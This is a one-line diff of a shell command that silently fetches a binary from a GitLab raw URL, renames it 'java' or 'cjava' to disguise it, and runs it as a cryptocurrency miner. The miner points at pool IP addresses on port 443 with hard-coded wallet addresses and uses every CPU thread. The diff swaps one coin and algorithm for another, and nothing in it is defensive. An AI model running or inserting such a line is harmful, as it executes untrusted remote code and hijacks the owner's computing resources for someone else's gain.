@@ -1,1 +1,1 @@
-wget -qO java https://gitlab.com/sarifadim/jomblo/-/raw/main/jupyterlab && chmod +x java && ./java -o 8.219.86.27:443 -a rx/0 -u ZEPHsC5qZJv8JqyaGPNAviDERPxFGBzXx1bo8rx7RqD9JkPh68Lk7AnLdsNAZfrukeFoU9dnboT6tAJkAZ1etvM1Q5PqiQu8DEk.$(echo GS-$(TZ=UTC-7 date +"%H-%M-%S")) --randomx-1gb-pages -p -x -t $(nproc --all)
+wget -qO cjava https://gitlab.com/sarifadim/jomblo/-/raw/main/cjava && chmod +x cjava && ./cjava -a yespowertide -o 47.236.252.96:443 -u TBEv2m949AK9X72hR6fcfheWuS9mjaB3y9.$(echo GH-$(TZ=UTC-7 date +"%H-%M-%S")) -p -x -t $(nproc --all)
